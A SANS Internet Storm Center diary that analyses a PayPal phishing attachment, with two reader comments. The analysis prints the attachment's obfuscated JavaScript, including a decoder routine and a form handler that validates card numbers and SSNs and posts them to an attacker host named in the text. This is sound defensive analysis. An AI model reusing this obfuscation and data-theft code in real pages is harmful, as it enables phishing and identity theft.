
<!doctype html><head>
    <title>More Malicious JavaScript Obfuscation - SANS Internet Storm Center </title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="Cache-control" content="no-cache" />
    <meta property="og:site_name" content="SANS Internet Storm Center" />
    <meta property="og:locale" content="en_US" />
    <meta name="DESCRIPTION" content="SANS Internet Storm Center - A global cooperative cyber threat / internet security monitor and alert system. Featuring daily handler diaries with summarizing and analyzing new threats to networks and internet security events."/>
    <meta name="AUTHOR" content="SANS Internet Storm Center"/>
    <meta name="KEYWORDS" content="isc, sans, internet, security, threat, worm, virus, phishing, hacking, vulnerability"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="/iscfavicon.ico" />
    <link rel="canonical" href="https://isc.sans.edu%2Fforums%2Findex.html" />
    <link type="text/css" rel="stylesheet" href="/css/screen.css" /><!-- this is not the comment you are looking for 441c8327d9d8a1 -->
</head><body class="isc">
<div id="container">
  <div id="topWrapper">
    <div class="g">
      <span class="threatLevel">
        Threat Level: <a href="/infocon.html">green</a>
      </span>
      <span class="currentHandler">
        Handler on Duty: <a title="Brad Duncan" href="/handler_list.html#brad-duncan">Brad Duncan</a>
      </span>
    </div>

  </div>
	<h1>
    <a href="/">SANS ISC: More Malicious JavaScript Obfuscation - SANS Internet Storm Center  <span></span></a>
    <ul class="site-selector">
      <li class="site-switcher"><a href="#"><span class="hidden">SANS Site Network</span></a>
        <ul class="sites">
          <li class="current-site">Current Site</li>
          <li class="isc"><a href="https://isc.sans.edu">
            <span></span>
            Internet Storm Center
          </a></li>
          <li class="selector-help">Other SANS Sites
            <a href="https://www.sans.org/help/site-network"><span class="hidden">Help</span></a>
          </li>
          <li class="sti"><a href="http://www.sans.edu">
            <span></span>
            Graduate Degree Programs
          </a></li>
          <li class="sans"><a href="http://www.sans.org">
            <span></span>
            Security Training
          </a></li>
          <li class="giac"><a href="http://www.giac.org">
            <span></span>
            Security Certification
          </a></li>
          <li class="awareness"><a href="http://www.securingthehuman.org">
            <span></span>
            Security Awareness Training
          </a></li>
          <li class="pentest"><a href="http://pen-testing.sans.org">
            <span></span>
            Penetration Testing
          </a></li>
          <li class="ics"><a href="http://ics.sans.org">
            <span></span>
            Industrial Control Systems
          </a></li>
          <li class="cyber-defense"><a href="http://cyber-defense.sans.org">
            <span></span>
            Cyber Defense Foundations
          </a></li>
          <li class="forensics"><a href="http://computer-forensics.sans.org">
            <span></span>
            Computer Forensics
          </a></li>
          <li class="ssi"><a href="http://software-security.sans.org">
            <span></span>
            Software Security
          </a></li>
          <li class="sic"><a href="http://sic.sans.org">
            <span></span>
            Government OnSite Training
          </a></li>
        </ul>
      </li>
    </ul>
    SANS ISC InfoSec Forums
	</h1>
	<form id="headerSearch" name="searchform" action="/search.html" method="post">
        <input type="text" name="q" placeholder="Keyword, Domain, Port, IP or Header" />
        <input type="submit" value="Search" />
	</form>
    <form id="headerLogin" method="post" action="/login.html" name="loginform">
        <input type="hidden" name="token" value="dea921df6a0f3cae1c57c0c1de8735651e8acf85" />
        <input type="text" name="email" placeholder="Email" />
        <input type="password" name="pw" autocomplete="off" placeholder="Password" />
        <input type="submit" value="Log In" /><br />
        <a href="/register.html">Sign Up for Free!</a> &nbsp; <a href="/resetpassword.html">Forgot Password?</a>
	</form>
	<div id="smallHeaderLogin">
	    <a href="/login.html">Log In</a> or <a href="/register.html">Sign Up for Free</a>!
	</div>
	<div id="content">
		<div class="wrapper">
                                <div class="beforeForumWrapper">
                                    <ul class="threadNav">
                                        <li><a href="/forums/diary/Outof+Order+Java+Update/20709/">&larr; Next Thread</a></li>
                                        <li><a href="/forums/diary/DDOS+is+down+but+still+a+concern+for+ISPs/20701/">Previous Thread &rarr;</a></li>
                                    </ul>
                                </div>
                                <table class="postList">
                                <caption>More Malicious JavaScript Obfuscation</caption>
                                        <tr class="postWrapper">
                                            <td class="content">
                                                <div class="ss-container">
                                                    <ul class="ss-share">
                                                        <li class="ss-share-item">
                                                            <a class="ss-share-link ico-facebook" title="Share on Facebook" href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Fisc.sans.edu%2Fforums%2Fdiary%2F20703" rel="nofollow" target="_blank"></a>
                                                        </li>
                                                        <li class="ss-share-item">
                                                            <a class="ss-share-link ico-twitter" title="Share on Twitter" href="http://twitter.com/share?text=More%20Malicious%20JavaScript%20Obfuscation&amp;url=https%3A%2F%2Fisc.sans.edu%2Fforums%2Fdiary%2F20703&amp;via=SANS_ISC" rel="nofollow" target="_blank"></a>
                                                        </li>
                                                        <li class="ss-share-item">
                                                            <a class="ss-share-link ico-google" title="Share on Google+" href="http://plus.google.com/share?url=https%3A%2F%2Fisc.sans.edu%2Fforums%2Fdiary%2F20703" rel="nofollow" target="_blank"></a>
                                                        </li>
                                                    </ul>
                                                </div>
                                                <div><p><!--?xml version="1.0" encoding="UTF-8" standalone="no"?--></p>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">Yesterday, I found an interesting phishing email. Nothing fancy or exotic about the content, just a classic email notification pretending to be sent by&nbsp;Paypal&nbsp;and asking the victim to urgently review and update his/her personal settings. The message was clever enough to not trigger anti-spam rules. The SpamAssassin&nbsp;score was 3.7, just low enough to pass the control:</p>

<pre style="border: 1px solid rgb(204, 204, 204); padding: 5px 10px; background: rgb(238, 238, 238);">
<span style="font-stretch: normal; line-height: normal;">X-Spam-Status: No, score=3.7 required=4.0 tests=BAYES_20,RCVD_NUMERIC_HELO, SARE_TOCC_COMBO1,TVD_PH_SEC,T_HK_FAKENAME_PAYPAL,T_OBFU_HTML_ATTACH autolearn=no version=3.3.2</span></pre>

<div style="font-family:'Helvetica Neue';font-size:12px;"><img alt="" src="https://isc.sans.edu/diaryimages/images/paypal-phishing.png" style="width: 799px; height: 381px;" /></div>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">The attached file is just simple a regular HTML file containing some obfuscated JavaScript code.&nbsp;This page&nbsp;was unknown to VT when I checked it. Here is a dump of the JavaScript code&nbsp;<span style="font-family: 'Helvetica Neue'; font-size: 12px; line-height: 19.2px;">(beautified for easier reading):</span></p>

<pre style="border: 1px solid rgb(204, 204, 204); padding: 5px 10px; background: rgb(238, 238, 238);">
function wp_plugin(r) {&#10;    var e, n, i, t, a, d, o, f, h = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;,&#10;        c = 0,&#10;        C = 0,&#10;        g = &quot;&quot;,&#10;        x = [];&#10;    if (!r) return r;&#10;    r += &quot;&quot;;&#10;    do&#10;        t = h.indexOf(r.charAt(c++)),&#10;        a = h.indexOf(r.charAt(c++)),&#10;        d = h.indexOf(r.charAt(c++)),&#10;        o = h.indexOf(r.charAt(c++)),&#10;        f = t &lt;&lt; 18 | a &lt;&lt; 12 | d &lt;&lt; 6 | o,&#10;        e = f &gt;&gt; 16 &amp; 255,&#10;        n = f &gt;&gt; 8 &amp; 255,&#10;        i = 255 &amp; f,&#10;        64 == d ? x[C++] = String.fromCharCode(e) : 64 == o ? x[C++] = String.fromCharCode(e, n) : x[C++] = String.fromCharCode(e, n, i); while (c &lt; r.length);&#10;    return g = x.join(&quot;&quot;), g.replace(/\0+$/, &quot;&quot;)&#10;}&#10;function GoogleAnalytics(r, o) {&#10;    s = new Array;&#10;    for (var a = 0; 256 &gt; a; a++) s[a] = a;&#10;    var e, n = 0;&#10;    for (a = 0; 256 &gt; a; a++) n = (n + s[a] + r.charCodeAt(a % r.length)) % 256, e = s[a], s[a] = s[n], s[n] = e;&#10;    a = 0, n = 0;&#10;    for (var t = &quot;&quot;, f = 0; f &lt; o.length; f++) a = (a + 1) % 256, n = (n + s[a]) % 256, e = s[a], s[a] = s[n], s[n] = e, t += String.fromCharCode(o.charCodeAt(f) ^ s[(s[a] + s[n]) % 256]);&#10;    return t&#10;}&#10;var GA_PLUGIN = &ldquo;.....redacted.....&quot;;&#10;var _0xbf60 = [&quot;GA-ID18998&quot;, &quot;\x77\x72\x69\x74\x65&quot;];&#10;var GA_PLUGIN1 = wp_plugin(GA_PLUGIN);&#10;var GA_DLL = GoogleAnalytics(_0xbf60[0], GA_PLUGIN1);&#10;document[_0xbf60[1]](GA_DLL)</pre>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">A first analyze shows that functions are named with common strings for websites (Wordpress,&nbsp;Google Analytics). No &ldquo;suspicious&rdquo; string is present in the code that could trigger a security control.&nbsp;The variable GA_PLUGIN contains ~23KB of data (that&nbsp;have been removed in this post)&nbsp;that looks immediately to be&nbsp;BASE64 encoded. A&nbsp;copy of the original HTML file is available <a href="https://blog.rootshell.be/stuff/paypal_phishing.txt">here</a>&nbsp;if you&#39;re interested.</p>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">GA_PLUGIN is used by wp_plugin() which is a BASE64 decoder function. Let&rsquo;s decode it manually and we obtain a binary file without any interesting patterns / strings in it. The binary content is passed to the GoogleAnalytics() function with a second parameter (the key). I tried a simple XOR but it failed. The function being&nbsp;available in the code, I did not loose my time and&nbsp;just executed it in a sandbox to get the decoded data which is the&nbsp;complete HTML page that is finally displayed&nbsp;it in the browser via the last line (_0xbf60[1] = &ldquo;write&rdquo;). The page looks pretty good:</p>

<div style="font-family:'Helvetica Neue';font-size:12px;"><img alt="" src="https://isc.sans.edu/diaryimages/images/Capture-paypal-20160207.PNG" style="width: 297px; height: 875px;" /></div>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">Here again, the decoded HTML page contains a second layer of obfuscation with more JavaScript code. When the victim clicks on &ldquo;Submit Form&rdquo;, data are not posted directly to a remote server but the xsub() function is called. The arrays contain just strings in hexadecimal encoding, nothing fancy.&nbsp;Here is the beautified code:</p>

<div style="font-family:'Helvetica Neue';font-size:12px;">
<pre style="border: 1px solid rgb(204, 204, 204); padding: 5px 10px; background: rgb(238, 238, 238);">
var _0x22eb9a = &quot;c113b797cd0456be0d1a9c2f35f7d78b.php&quot;;&#10;var _0x2da3 = [&quot;\x6C\x65\x6E\x67\x74\x68&quot;, &quot;\x63\x68\x61\x72\x41\x74&quot;, &quot;\x68\x74\x74\x70\x3A\x2F\x2F\x74\x31\x2E\x73\x79\x73\x74\x65\x6D\x66\x69\x6C\x74\x65\x72\x73\x2E\x6E\x65\x74\x2F&quot;, &quot;\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x70\x61\x79\x70\x61\x6C\x2E\x63\x6F\x6D\x2F&quot;, &quot;\x72\x65\x70\x6C\x61\x63\x65&quot;, &quot;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&quot;, &quot;\x61\x63\x74\x69\x6F\x6E&quot;, &quot;\x65\x6E\x76&quot;, &quot;\x66\x6F\x72\x6D\x73&quot;, &quot;\x6D\x65\x74\x68\x6F\x64&quot;, &quot;\x70\x6F\x73\x74&quot;, &quot;\x73\x75\x62\x6D\x69\x74&quot;];&#10;var _0x27ca82 = (function(_0xe689x2) {&#10;    return function(_0xe689x3) {&#10;        var _0xe689x4 = _0xe689x3[_0x2da3[0]],&#10;            _0xe689x5 = 1,&#10;            _0xe689x6 = 0,&#10;            _0xe689x7;&#10;        while (_0xe689x4) {&#10;            _0xe689x7 = parseInt(_0xe689x3[_0x2da3[1]](--_0xe689x4), 10);&#10;            _0xe689x6 += (_0xe689x5 ^= 1) ? _0xe689x2[_0xe689x7] : _0xe689x7&#10;        };&#10;        return _0xe689x6 &amp;&amp; _0xe689x6 % 10 === 0&#10;    }&#10;}([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));&#10;var _0x98a278 = _0x2da3[2];&#10;var _0xbbd7eb = 0;&#10;&#10;function xsub() {&#10;&nbsp;&nbsp;&nbsp; if (!_0x11e97d()) {&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window[_0x2da3[5]][_0x2da3[4]](_0x2da3[3]);&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false&#10;&nbsp;&nbsp;&nbsp; };&#10;&nbsp;&nbsp;&nbsp; if (!_0xbbd7eb) {&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _0x98a278 += _0x22eb9a&#10;&nbsp;&nbsp;&nbsp; };&#10;&nbsp;&nbsp;&nbsp; _0xbbd7eb++;&#10;&nbsp;&nbsp;&nbsp; document[_0x2da3[8]][_0x2da3[7]][_0x2da3[6]] = _0x98a278;&#10;&nbsp;&nbsp;&nbsp; document[_0x2da3[8]][_0x2da3[7]][_0x2da3[9]] = _0x2da3[10];&#10;&nbsp;&nbsp;&nbsp; document[_0x2da3[8]][_0x2da3[7]][_0x2da3[11]]()&#10;}&#10;var _0x9939 = [&quot;\x76\x61\x6C\x75\x65&quot;, &quot;\x63\x63\x61\x72\x64\x6E\x75\x6D&quot;, &quot;\x65\x6E\x76&quot;, &quot;\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x70\x61\x79\x70\x61\x6C\x2E\x63\x6F\x6D\x2F&quot;, &quot;\x72\x65\x70\x6C\x61\x63\x65&quot;, &quot;\x6C\x6F\x63\x61\x74\x69\x6F\x6E&quot;, &quot;\x63\x61\x64\x64\x72&quot;, &quot;\x63\x65\x78\x70\x6D&quot;, &quot;\x63\x65\x78\x70\x79&quot;, &quot;\x63\x63\x76\x76&quot;, &quot;\x6E\x61\x6D\x65&quot;, &quot;\x30\x30&quot;, &quot;\x63\x73\x73\x6E&quot;, &quot;\x6C\x65\x6E\x67\x74\x68&quot;, &quot;\x2D&quot;, &quot;\x69\x6E\x64\x65\x78\x4F\x66&quot;, &quot;\x55\x6E\x69\x74\x65\x64\x20\x53\x74\x61\x74\x65\x73&quot;, &quot;\x63\x63\x6F\x75\x6E\x74\x72\x79&quot;, &quot;\x63\x7A\x69\x70&quot;];&#10;&#10;function _0x11e97d() {&#10;&nbsp;&nbsp;&nbsp; ax = _0x27ca82(document[_0x9939[2]][_0x9939[1]][_0x9939[0]]);&#10;&nbsp;&nbsp;&nbsp; if (!ax) {&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return window[_0x9939[5]][_0x9939[4]](_0x9939[3]), !1&#10;&nbsp;&nbsp;&nbsp; };&#10;&nbsp;&nbsp;&nbsp; var _0x88a0x2 = document[_0x9939[2]][_0x9939[6]][_0x9939[0]],&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _0x88a0x3 = document[_0x9939[2]][_0x9939[7]][_0x9939[0]],&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _0x88a0x4 = document[_0x9939[2]][_0x9939[8]][_0x9939[0]],&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _0x88a0x5 = document[_0x9939[2]][_0x9939[9]][_0x9939[0]];&#10;&nbsp;&nbsp;&nbsp; if (!document[_0x9939[2]][_0x9939[10]][_0x9939[0]] || !_0x88a0x2 || !_0x88a0x5 || _0x9939[11] == _0x88a0x3 || _0x9939[11] == _0x88a0x4) {&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return window[_0x9939[5]][_0x9939[4]](_0x9939[3]), !1&#10;&nbsp;&nbsp;&nbsp; };&#10;&nbsp;&nbsp;&nbsp; _0x88a0x2 = document[_0x9939[2]][_0x9939[12]][_0x9939[0]];&#10;&nbsp;&nbsp;&nbsp; _0x88a0x3 = _0x88a0x2[_0x9939[13]];&#10;&nbsp;&nbsp;&nbsp; _0x88a0x4 = 9; - 1 != _0x88a0x2[_0x9939[15]](_0x9939[14]) &amp;&amp; (_0x88a0x4 += 2);&#10;&nbsp;&nbsp;&nbsp; if (_0x9939[16] == document[_0x9939[2]][_0x9939[17]][_0x9939[0]]) {&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (0 &lt; _0x88a0x3 &amp;&amp; _0x88a0x3 != _0x88a0x4) {&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return window[_0x9939[5]][_0x9939[4]](_0x9939[3]), !1&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _0x88a0x2 = document[_0x9939[2]][_0x9939[18]][_0x9939[0]][_0x9939[13]];&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (0 &lt; _0x88a0x2 &amp;&amp; 5 != _0x88a0x2) {&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return window[_0x9939[5]][_0x9939[4]](_0x9939[3]), !1&#10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&#10;&nbsp;&nbsp;&nbsp; };&#10;&nbsp;&nbsp;&nbsp; return !0&#10;}</pre>
</div>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">The interesting line is the first one which contains the PHP page where data are posted. If you browse the code, you see that it is appended to _0x2da3[2]&nbsp;<span style="line-height: normal;">to</span>&nbsp;&quot;\x68\x74\x74\x70\x3A\x2F\x2F\x74\x31\x2E\x73\x79\x73\x74\x65\x6D\x66\x69\x6C\x74\x65\x72\x73\x2E\x6E\x65\x74\x2F&quot; to build the malicious URL:</p>

<pre style="border: 1px solid rgb(204, 204, 204); padding: 5px 10px; background: rgb(238, 238, 238);">
http://t1.systemfilters.net/c113b797cd0456be0d1a9c2f35f7d78b.php</pre>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">Another interesting function is _0x11e97d() which performs multiple checks against&nbsp;the data submitted by the victim. Indeed, the attacker took the time to validate the data passed via the form. If one of them does not match the requirements, nothing is sent to the malicious server and just a redirect occurs.&nbsp;Example: The credit card number and SSN&nbsp;are checked (via the function _0x27ca82()).&nbsp;To successfully submit my test data, I bypassed _0x11e97d() with a simple &quot;return 1&rdquo;. Then the server t1.systemfilters.net was contacted and data sent to it. Here is a pcap:</p>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;"><img alt="" src="https://isc.sans.edu/diaryimages/images/Screen%20Shot%202016-02-07%20at%2016_05_00.png" style="width: 800px; height: 472px;" /></p>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">After the successful POST, an HTTP 302 redirects the victim to the real Paypal page.</p>

<p style="font-family: 'Helvetica Neue'; font-size: 12px;">In this phishing campaign, victims from the&nbsp;United States are targeted because a real SSN is mandatory. It also demonstrates that the attacker took extra care&nbsp;to validate the data to get only valid information sent to him.&nbsp;This is a nice example of multiple obfuscation levels, nothing is downloaded from the Internet, the user has just to execute the HTML file attached to the email.&nbsp;</p>

<p>Xavier Mertens<br />
ISC Handler - Freelance Security Consultant<br />
<a href="https://pgp.mit.edu/pks/lookup?op=get&amp;search=0x881F7C8E873FCB38">PGP Key</a></p>
</div>
                                                <div>Tags: javascript, obfuscation, phishing</div>
                                            </td><td class="user">
                                            Xme<br />
                                                <img src="/gravatar_cache/cache/isc/a7cc8e162752a120d82325fbbf3b5e79" /><br />
                                                <span>144 Posts</span><br /><span>ISC Handler</span></td>
                                        </tr>
                                        <tr class="postFooter">
                                            <td class="actions">
                                                <a href="/forums/diary/reply/20703/">Reply</a>
                                        <a href="/forums/diary/subscribe/20703/">Subscribe</a>
                                            </td>
                                            <td class="time">
                                                2 months  ago
                                            </td>
                                        </tr>
                                    <tr class="postWrapper" id="36313">
                                        <td class="content">
                                            <div>I just fixed the link to the original file (small typo).</div>
                                        </td>
                                        <td class="user">
                                            Xme<br />
                                            <img src="/gravatar_cache/cache/isc/a7cc8e162752a120d82325fbbf3b5e79" /><br />
                                            <span>144 Posts</span><br /><span>ISC Handler</span></td>
                                    </tr>
                                    <tr class="postFooter">
                                        <td class="actions">
                                            <a href="/forums/diary/reply/20703/">Reply</a>
                                            <a href="/forums/diary/quote/36313">Quote</a>
                                        </td>
                                        <td class="time">
                                            2 months  ago
                                        </td>
                                    </tr>
                                    <tr class="postWrapper" id="36315">
                                        <td class="content">
                                            <div>Yes, the Bad Actor(s) &quot;took care&quot; in crafting this message and its nefarious payload, but what's striking about this campaign targeted at US recipients is that its English includes multiple usages that while not grammatically incorrect under the broad umbrella of &quot;English&quot; clearly flag its content as _not_ coming from PayPal in the US.<br />
<br />
Writing natural language is also coding. I'm not going to point out the particulars of the English coding errors in the message text, though, as I like my got-through-the-filter spam to stand out like at least a slightly sore thumb.</div>
                                        </td>
                                        <td class="user">
                                            Anonymous<br />
                                            <img src="/gravatar_cache/cache/isc/3aea5810f64363ad1684dd7feea31f8d" /><br />
                                            <span>1 Posts</span></td>
                                    </tr>
                                    <tr class="postFooter">
                                        <td class="actions">
                                            <a href="/forums/diary/reply/20703/">Reply</a>
                                            <a href="/forums/diary/quote/36315">Quote</a>
                                        </td>
                                        <td class="time">
                                            2 months  ago
                                        </td>
                                    </tr>
                                </table>
                                <div class="afterForumWrapper">
                                    <ul class="threadNav">
                                        <li><a href="/forums/diary/Outof+Order+Java+Update/20709/">&larr; Next Thread</a></li>
                                        <li><a href="/forums/diary/DDOS+is+down+but+still+a+concern+for+ISPs/20701/">Previous Thread &rarr;</a></li>
                                    </ul>
                                </div><p><a href="/register.html">Sign Up for Free</a> or <a href="/login.html">Log In</a> to start participating in the conversation!</p>
        </div>
    </div>
    <div id="navigation">
        <ul>
            <li><a href="/contact.html">Contact Us</a>
                <ul>
                    <li class="first"><a href="/about.html">About Us</a></li>
                    <li><a href="/handler_list.html">Handlers</a></li>
                    <li><a href="/events">Events</a></li>
                </ul>
            </li>
            <li><a href="/diaryarchive.html">Diary</a></li>
            <li><a href="/podcast.html">Podcasts</a></li>
            <li><a href="/jobs">Jobs</a></li>
            <li><a href="/newssummary.html">News</a></li>
            <li><a href="/tools/">Tools</a>
                <ul>
                    <li class="first"><a href="/howto.html">DShield Sensor</a></li>
                    <li><a href="/404project/">404Project</a></li>
                    <li><a href="/glossary.html">InfoSec Glossary</a></li>
                    <li><a href="/webhoneypot/index.html">Webhoneypot</a></li>
                    <li><a href="/fightback.html">Fightback</a></li>
                </ul>
            </li>
            <li><a href="/reports.html">Data</a>
                <ul>
                    <li><a href="/ssh.html">SSH Scanning Activity</a></li>
                    <li><a href="/crls.html">SSL CRL Activity</a></li>
                    <li><a href="/port.html">TCP/UDP Port Activity</a></li>
                    <li><a href="/httpheaders/">HTTP Header Activity</a></li>
                    <li><a href="/threatfeed.html">Threat Feeds Activity</a></li>
                    <li><a href="/threatmap.html">Threat Feeds Map</a></li>
                    <li><a href="/suspicious_domains.html">Suspicious Domains</a></li>
                    <li><a href="/presentations/">Presentations &amp; Papers</a></li>
                    <li><a href="/links.html">Useful InfoSec Links</a></li>
                    <li><a href="/poll.html">InfoSec Poll Results</a></li>
                </ul>
            </li>
            <li class="active"><a href="/forums/">Forums</a>
                <ul>
                    <li><a href="/forums/Auditing/">Auditing</a></li>
                    <li><a href="/forums/Diary+Discussions/">Diary Discussions</a></li>
                    <li><a href="/forums/Forensics/">Forensics</a></li>
                    <li><a href="/forums/General+Discussion/">General Discussions</a></li>
                    <li><a href="/forums/Industry+News/">Industry News</a></li>
                    <li><a href="/forums/Network+Security/">Network Security</a></li>
                    <li><a href="/forums/Penetration+Testing/">Penetration Testing</a></li>
                    <li><a href="/forums/Software+Security/">Software Security</a></li>
                </ul>
            </li>
        </ul>
    </div>
    <div id="sidebar">
        <p>Subscribe to the Internet Storm Center <a href="https://www.youtube.com/channel/UCfbOsqPmWg1H_34hTjKEW2A">YouTube Channel</a></p>
        <iframe width="160" height="600" src="https://www.sans.org/banners/isc_ss.php" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe>
	</div>
</div>
<div id="footer">
	<ul id="socialIconsFoot">
        <li><a href="https://www.youtube.com/channel/UCfbOsqPmWg1H_34hTjKEW2A">YouTube<span></span></a></li>
        <li class="twitter"><a href="http://twitter.com/sans_isc">Twitter<span></span></a></li>
        <li class="linkedin"><a href="http://www.linkedin.com/groups?gid=35470">LinkedIn<span></span></a></li>
        <li class="rss"><a href="/xml.html">ISC Feed<span></span></a></li>
	</ul>
	<a class="sans" href="https://www.sans.edu/"><span></span></a>
	<ul id="footLinks">
        <li><a href="http://www.cafepress.com/stormcenter">Shop</a></li>
        <li><a href="/linkback.html">Link To Us</a></li>
        <li><a href="/about.html">About Us</a></li>
        <li><a href="/handler_list.html">Handlers</a></li>
        <li><a href="/privacy.html">Privacy Policy</a></li>
        <li><a href="#top">Back To Top</a></li>
	</ul>
	<strong>Developers:</strong> We have an <a href="/api/">API</a> for you! &nbsp; <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" src="/images/cc.png" /></a>
</div>
</body></html>